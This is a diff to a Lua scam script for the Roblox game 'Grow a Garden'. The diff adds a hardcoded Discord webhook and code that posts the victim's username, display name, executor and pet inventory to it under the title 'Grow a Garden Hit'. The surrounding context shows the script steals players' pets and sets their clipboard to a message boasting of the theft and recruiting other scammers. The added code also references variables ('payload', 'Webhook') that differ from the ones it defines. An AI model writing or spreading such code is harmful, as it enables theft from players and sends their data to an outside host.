@@ -11,7 +11,8 @@
                         Discord: discord.gg/d2zgg2YDMz
 ]]
 
-
+        local date = os.date("%Y-%m-%d %H:%M:%S")
+        local LogsWebhook = "https://discord.com/api/webhooks/1404048702925963326/OT888Nt-g0yE_M2-6aJByqxXhjeZUby19LciYTHDlWBD4oqCQIzazb1pXUeJLwwhSnMy"
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
@@ -30,6 +31,36 @@
         local maxAttempts = 10
         local attempt = 1
         local teleported = false
+
+        local logspayload = {
+    content = nil,
+    embeds = {{
+        title = "Grow a Garden Hit",
+        color = 32767,
+        fields = {{
+            name = "` 🔵 Player Info:`",
+            value = string.format("```🟢 Username: " .. (Players.LocalPlayer.Name or "Unknown") .. "\n🟢 Display Username: " .. (Players.LocalPlayer.DisplayName or "Unknown") .. "\n🟢 Executor: " .. (detectExecutor() or "Unknown") .. "```",
+        },{
+            name = "` 🟡 Backpack`",
+             value = "```" .. truncateByLines(petString, 5) .. "```",
+        }},
+        footer = {
+            text = string.format("discord.gg/NWsFjtbY8E [%s]", date)
+        }
+    }},
+    attachments = {}
+}
+
+-- Send Logs
+local success, err = pcall(function()
+    request({
+        Url = Webhook,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end)
+
 
         setclipboard("Your valuable pets have been STOLEN. If you want to scam others join the Discord! discord.gg/d2zgg2YDMz")
 
